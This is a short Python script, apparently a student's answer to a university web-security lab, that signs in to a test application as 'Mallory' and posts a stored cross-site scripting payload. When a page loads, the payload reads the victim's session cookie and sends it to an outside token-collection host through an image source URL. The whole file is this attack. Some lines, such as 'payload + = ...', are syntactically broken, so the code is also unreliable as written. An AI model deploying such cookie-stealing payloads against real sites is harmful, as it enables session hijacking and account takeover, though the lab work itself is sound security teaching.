import os, requests, urllib

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# reset the application
requests.get(BASE + '/reset.php')
payload = ''
payload + = '<script>window.onload=function(){document.getElementsByClassName("col-md-1")'+
payload + = '[document.getElementsByClassName("col-md-1").length-1].firstElementChild.src='+
payload + = '"http://token.cms-weblab.utsc.utoronto.ca/set.php?sid=999709873&token="+document.cookie.split("=")[1];'+
payload + = 'document.getElementsByClassName("col-md-1")[0].firstElementChild.src="http://google.ca"}</script>'

test = '<script>console.log(document.getElementsByClassName("col-md-1"))</script>'
#######  your attack goes here  #######
with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)
     # post a message (GET request)
     res = s.get(BASE + '/post.php', params={'msg': payload})
     print res
     print res.text

# #########################################

#<script>"http://token.cms-weblab.utsc.utoronto.ca/set.php?sid=999709873&token=" + document.cookie.split("=")[1]</script>